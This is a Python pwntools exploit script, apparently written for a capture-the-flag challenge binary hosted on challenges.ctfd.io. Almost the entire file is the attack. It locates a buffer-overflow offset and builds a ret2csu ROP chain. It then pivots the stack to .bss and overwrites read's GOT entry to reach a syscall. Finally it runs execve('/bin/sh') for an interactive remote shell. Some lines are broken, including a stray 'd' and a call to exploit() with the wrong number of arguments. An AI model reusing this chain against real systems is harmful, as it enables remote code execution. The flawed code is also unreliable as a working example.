from pwn import *
from struct import pack
import time

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

LOCAL_LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "libc-2.27.so"

REMOTE_IP = 'challenges.ctfd.io'
REMOTE_PORT = 30096

VULN_BIN = './bof'

GDB_FLAGS = """
            c
            """

READUNTIL_STRING = ''

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call read function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF(VULN_BIN)
context.binary = VULN_BIN
libc  = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rlibc = ELF('./libc-2.27.so')
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

# Find manually
crashOffset = offset

rop = ROP(elf)
crashOffset = 136
junk = b'b'*(crashOffset)
d
bss = 0x404100
text = 0x401000 # .text section

def csuCall(baseFunc, offset, first, second, third, pad=True):
    """
    csu_pop --> 
    pop rbx,rbp,r12,r13,r14,r15
    csu_call --> r15 + (rbx*8); RSI = R13, RDI=R12, RDX=R14
    Thus, I can call any function as (baseFunc + (offset*8)) 
    """
    csu_call = 0x401188
    csu_pop = 0x4011a2
    payload = p64(csu_pop)
    payload += p64(offset)    # rbx
    payload += p64(1)    # rbp
    payload += p64(first)    # r12
    payload += p64(second)    # r13
    payload += p64(third)    # r14
    payload += p64(baseFunc)    # r15
    payload += p64(csu_call)
    # payload += cyclic(0x20)
    if pad:
        payload += b'a'*56
    return payload


def exploit(local=False):
    if local:
        r = elf.process()
        gdb.attach(r.pid, '''
        b *0x401191
        b *0x401146
        ''')
    else:
        r = remote(REMOTE_IP, REMOTE_PORT)
    # The buffer in stack is too small, lets create a new buffer for ourselves
    # at some bss
    payload = csuCall(elf.got['read'], 0, 0,bss, 0x500, pad=True) 
    payload += p64(0x00000000004011a5)  # Pop rsp,r13,r14,r15,ret
    payload += p64(bss)  # New stack
    r.sendline(junk + payload)
    r.clean()
    npayload = b'/bin/sh\x00' + p64(bss) +b'deadbeef'
    # Read as input offset to syscall. Convert read to syscall
    npayload += csuCall(elf.got['read'], 0, 0, elf.got['read'], 1, pad=True) 
    # Read 0x3b bytes using the now new syscall(1, text, 0x3b) function
    npayload += csuCall(elf.got['read'], 0, 1, text, 0x3b, pad=False)
    # Now call systemcall(execve('/bin/sh', 0, 0))
    npayload += csuCall(elf.got['read'], 0, bss, 0, 0, pad=False)
    time.sleep(1)
    r.sendline(npayload)
    time.sleep(1)
    r.sendline(b'\x7f') # Locally \xb0  --> byte offset of syscall in read function
    if r.can_recv():
        r.interactive()
    else:
        r.close()
    return r

for i in range(0, 100):
    r = exploit(False, 0xa398)
